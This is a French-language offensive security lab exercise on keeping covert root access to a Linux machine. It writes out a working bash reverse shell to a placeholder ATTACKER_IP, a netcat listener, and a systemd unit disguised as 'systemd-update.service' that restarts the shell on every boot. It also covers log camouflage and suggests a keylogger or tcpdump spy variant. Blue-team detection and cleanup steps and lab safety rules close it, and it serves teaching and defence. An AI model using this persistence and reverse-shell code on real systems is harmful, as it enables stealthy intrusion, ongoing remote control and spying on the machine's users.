# **TP Offensif – Persistance via systemd et services Linux**





# **Objectif**

Comprendre comment un attaquant :

* Crée un service systemd personnalisé pour **persister** après redémarrage
* Masque ses activités via des noms légitimes (`systemd-update.service`)
* Déploie un reverse shell **camouflé comme un service système**
* Peut exécuter un keylogger ou un script espion à chaque démarrage

---

## **Contexte du TP**

Vous êtes dans un lab isolé. Vous avez obtenu un accès `root` sur une machine Linux via une faille. Votre objectif est de **maintenir un accès furtif et persistant** même après un redémarrage.

---

## **Étape 1 – Création d’un faux service `systemd` malveillant**

### 1.1 Créez un reverse shell (bash)

```bash
mkdir -p /opt/.malicious
nano /opt/.malicious/reverse.sh
```

Contenu :

```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Remplacez `ATTACKER_IP` par l’IP de votre Kali Linux.
Ensuite :

```bash
chmod +x /opt/.malicious/reverse.sh
```

Côté attaquant :

```bash
nc -lvnp 4444
```

---

### 1.2 Création du service déguisé

```bash
nano /etc/systemd/system/systemd-update.service
```

Contenu :

```ini
[Unit]
Description=System Update Daemon
After=network.target

[Service]
Type=simple
ExecStart=/opt/.malicious/reverse.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

---

### 1.3 Activation et camouflage

```bash
systemctl daemon-reload
systemctl enable systemd-update
systemctl start systemd-update
```

Le reverse shell se relancera automatiquement à chaque redémarrage, comme s’il s’agissait d’un vrai service système.

---

## **Étape 2 – Observation de la persistance**

Redémarrez la machine victime :

```bash
reboot
```

Sur la machine de l’attaquant (Kali), le shell revient automatiquement :

```
Connection from 192.168.1.X:xxxx
bash-5.1#
```

---

## **Étape 3 – Déguisement avancé (optionnel)**

Renommer les fichiers de logs :

```bash
touch /var/log/systemd-journal.log
```

Modifier le script pour logger dans un fichier apparemment légitime :

```bash
echo "shell actif : $(date)" >> /var/log/systemd-journal.log
```

---

## **Étape 4 – Nettoyage (à faire dans le TP final)**

Montrez comment un **analyste blue team** détecterait cette attaque :

```bash
systemctl list-units --type=service
systemctl cat systemd-update
```

Puis :

```bash
systemctl disable systemd-update
rm /etc/systemd/system/systemd-update.service
rm -rf /opt/.malicious/
```

---

## **Bonus – Variante avec keylogger ou espion**

Créer un service `usb-watcher.service` qui lit les événements `udev`, ou exécute un script Python qui écoute les touches (`pynput`), ou un enregistrement réseau avec `tcpdump`.

---

## **Évaluation**

Vous allez :

* Créer un service systemd malveillant
* L’activer pour qu’il s’exécute au démarrage
* Camoufler le service (nom, chemin)
* Démontrer que le service redonne un shell après reboot
* Montrer le code source, la configuration systemd et les effets en live
* Fournir un guide de suppression post-analyse





#  **Environnement recommandé pour le TP – Persistance via systemd**

---

## **1. Système d’exploitation cible (victime)**

### **Distribution conseillée :**

* **Debian 11 ou 12** (stable, systemd activé par défaut)
* **ou Ubuntu Server 20.04 / 22.04 LTS** (pratique, largement utilisé en production)

### **Pourquoi ces choix ?**

* Incluent `systemd` activé par défaut
* Parfaitement compatibles avec `bash`, `nc`, `python3`
* Très proches des environnements Linux réels (serveurs cloud, VPS, etc.)

### **Installation minimale recommandée :**

* Installez la version **"server"** sans interface graphique
* Activez le **réseau en NAT ou host-only**

---

## **2. Machine d’attaque**

### **Distribution conseillée :**

* **Kali Linux (dernière version stable)**

### **Raisons :**

* Outils préinstallés : `netcat`, `nmap`, `wireshark`, `burpsuite`, `tcpdump`, etc.
* Interface graphique (facultative)
* Support Python, exploitation, scripts, reverse shells

---

## **3. Configuration réseau du lab**

### **Topologie minimale (2 machines virtuelles sur VirtualBox, VMware ou Proxmox) :**

| Machine       | Rôle      | Adresse IP (exemple) |
| ------------- | --------- | -------------------- |
| Kali Linux    | Attaquant | 192.168.56.10        |
| Debian/Ubuntu | Victime   | 192.168.56.11        |

**Type de réseau :**

* `Host-only adapter` (accès entre les VMs uniquement)
* ou `Internal network` si vous voulez **un isolement total**

---

## **4. Paquets à installer (sur la victime)**

Connectez-vous en `root` et installez les paquets nécessaires :

```bash
apt update
apt install -y netcat-traditional python3 mailutils systemd
```

Facultatif pour espionnage/bonus :

```bash
apt install tcpdump
apt install python3-pynput
```

---

## **5. Outils à activer/configurer**

* **Autoriser netcat à écouter/émettre sur TCP** :

  * Utiliser `nc -lvnp 4444` côté attaquant
  * Utiliser `/dev/tcp/` côté victime

* **Configurer le firewall (ufw ou iptables)** pour permettre temporairement le port 4444 **si activé**

---

## **6. Mesures de sécurité pédagogique**

1. **Ce TP doit toujours être fait dans une machine virtuelle.**
2. **Ne jamais exécuter les reverse shells sur un réseau réel.**
3. **L’IP de retour (`ATTACKER_IP`) doit être une IP de lab local.**
4. Après l’exercice, supprimer :

   * Le service `systemd-update.service`
   * Le répertoire `/opt/.malicious/`
   * Tout contenu dans `/var/log/` lié au TP
5. **Créer un snapshot** avant l’attaque pour retour à l’état initial.

---

## **7. Outils d'observation (Blue Team)**

Pour détecter les services suspects, utilisez :

```bash
systemctl list-units --type=service
systemctl cat systemd-update
journalctl -u systemd-update
ps aux | grep reverse
ls -la /etc/systemd/system/
```



## **Option facultative – Simuler sur un conteneur LXC (avancé)**

Vous pouvez aussi faire tourner Debian dans un **conteneur LXC** sécurisé (Proxmox ou Docker + systemd activé).
Cela permet de :

* Démarrer/arrêter facilement
* Isoler totalement les processus
* Tester rapidement la persistance sans impact sur l'hôte


